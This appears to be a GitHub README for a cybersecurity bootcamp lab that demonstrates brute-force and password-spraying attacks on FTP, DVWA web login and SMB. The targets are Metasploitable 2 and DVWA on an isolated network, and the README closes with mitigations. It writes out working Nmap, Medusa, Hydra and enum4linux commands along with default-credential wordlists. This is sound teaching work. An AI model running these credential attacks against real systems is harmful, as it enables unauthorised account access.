# 🛡️ Brute Force Attacks Lab with Kali Linux and Medusa
![Status](https://img.shields.io/badge/status-active-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Made with](https://img.shields.io/badge/made%20with-Kali%20Linux-red)
![Pentest](https://img.shields.io/badge/type-pentest-critical)
![Bootcamp](https://img.shields.io/badge/bootcamp-DIO%2FSantander-purple)
![Ethical](https://img.shields.io/badge/use-educational%20only-important)
![Stars](https://img.shields.io/github/stars/stephenroque/dio-kali-medusa-bruteforce-lab?style=social)

Educational project executed in a controlled environment for learning offensive cybersecurity techniques, focusing on brute force attacks.

---

## 🧠 About This Project

This laboratory was developed as part of the **Santander Cybersecurity 2025 Bootcamp** on the **Digital Innovation One (DIO)** platform.

The main goals of this project are:

* Understand how brute force attacks work against common services (FTP, Web and SMB);
* Use **Kali Linux** as a security auditing environment;
* Automate authentication attacks using **Medusa**;
* Perform basic service and user enumeration;
* Document technical processes clearly and professionally;
* Identify common vulnerabilities and propose mitigation measures;
* Use GitHub as a technical portfolio.

⚠️ **Ethical Notice:** All tests described in this repository were performed **exclusively in isolated, vulnerable, and authorized environments**, such as **Metasploitable 2** and **DVWA**. **No attacks were executed against real systems.**

---

## 🎯 Learning Objectives

By completing this project, it was possible to:

* Understand brute force attacks across different protocols;
* Apply offensive security tools responsibly;
* Analyze the impact of weak credentials;
* Strengthen documentation and reporting skills;
* Reinforce the importance of defensive security practices.

---

## 🛠️ Test Environment

### 🖥️ Virtual Machines

| Machine          | Operating System                | Role               |
| ---------------- | ------------------------------- | ------------------ |
| Kali Linux       | Kali Linux Rolling              | Attacker           |
| Metasploitable 2 | Vulnerable Linux                | Target             |
| DVWA             | Damn Vulnerable Web Application | Vulnerable Web App |

### 🌐 Network Configuration

* Hypervisor: VirtualBox
* Network mode: **Host-Only Adapter**
* Isolated communication between virtual machines
* No external internet exposure

This setup ensures a safe and controlled environment for offensive security testing.

---

## 🔎 Initial Enumeration

Before executing any attacks, service enumeration was performed using **Nmap** to identify open ports and running services.

```bash
nmap -sV -p 21,80,445 192.168.56.101
```

### 🔍 Identified Services

* FTP (Port 21)
* HTTP / DVWA (Port 80)
* SMB (Port 445)

These services were used as attack vectors in the simulated scenarios.

---

## 🔐 FTP Brute Force Attack

### 📄 Wordlists Used

**Users ([`users.txt`](/wordlists/users.txt))**

```
admin
root
msfadmin
user
```

**Passwords ([`passwords.txt`](/wordlists/passwords.txt))**

```
123456
password
admin
msfadmin
```

### ▶️ Medusa Execution

Attack against a specific user:

```bash
medusa -h 192.168.56.101 -u msfadmin -P passwords.txt -M ftp
```

Attack using a list of users:

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
```

### ✅ Outcome

Medusa successfully identified valid credentials due to the use of weak and predictable passwords on the FTP service.

This demonstrates how poorly configured services can be easily compromised.

---

## 🌐 Web Application Attack (DVWA)

### ⚙️ Application Setup

* Application: **Damn Vulnerable Web Application (DVWA)**
* Security level: **Low**
* Login page: `/dvwa/login.php`

### 📌 Important Note

Medusa is not ideal for complex web forms. In this scenario, the goal was to understand **automated login attempts** and the risks associated with weak credentials in web applications.

Optionally, **Hydra** was used to simulate an HTTP POST brute force attack:

```bash
hydra -l admin -P passwords.txt 192.168.56.101 http-post-form \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

## 🗂️ SMB Password Spraying

### 🔎 User Enumeration

Before the attack, SMB users were enumerated:

```bash
enum4linux -U 192.168.56.101
```

### ▶️ Medusa Execution

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt
```

### 📘 Password Spraying Concept

Password spraying consists of testing **one common password** against **multiple user accounts**, reducing the risk of account lockout while exploiting weak credential reuse.

---

## 🛡️ Mitigation Measures

Based on the simulated attacks, the following security measures are recommended:

* Use strong and unique passwords;
* Implement Multi-Factor Authentication (MFA);
* Limit login attempts and apply rate limiting;
* Account lockout policies;
* Continuous monitoring and log analysis;
* Deployment of IDS/IPS solutions;
* Disable unnecessary services;
* Regular system and application updates.

Detailed recommendations can be found in [`notes/mitigations.md`](/notes/mitigations.md).

---

## 📁 Repository Structure

```
dio-kali-medusa-bruteforce-lab/
│
├── README.md
├── wordlists/
│   ├── users.txt
│   └── passwords.txt
├── commands/
│   ├── ftp.txt
│   ├── dvwa.txt
│   └── smb.txt
└── notes/
    └── mitigations.md
```

---

## 📘 Conclusions and Learnings

This lab provided hands-on experience with brute force attack techniques and demonstrated how weak credentials can compromise poorly protected services.

Beyond the technical execution, the project reinforced the importance of **ethical responsibility**, **clear documentation**, and **defensive security practices** as essential components of cybersecurity work.

> Note: Screenshots were intentionally omitted to focus on technical documentation
> and conceptual understanding, without re-running attacks outside the original
> learning environment.


---

## 📚 References

* Kali Linux — [https://www.kali.org/](https://www.kali.org/)
* Medusa — [http://www.foofus.net/jmk/medusa/medusa.html](http://www.foofus.net/jmk/medusa/medusa.html)
* DVWA — [http://www.dvwa.co.uk/](http://www.dvwa.co.uk/)
* Nmap — [https://nmap.org/book/](https://nmap.org/book/)

---

✍️ **Author:** Stephen Roque
📌 Educational project developed for the Digital Innovation One (DIO) platform.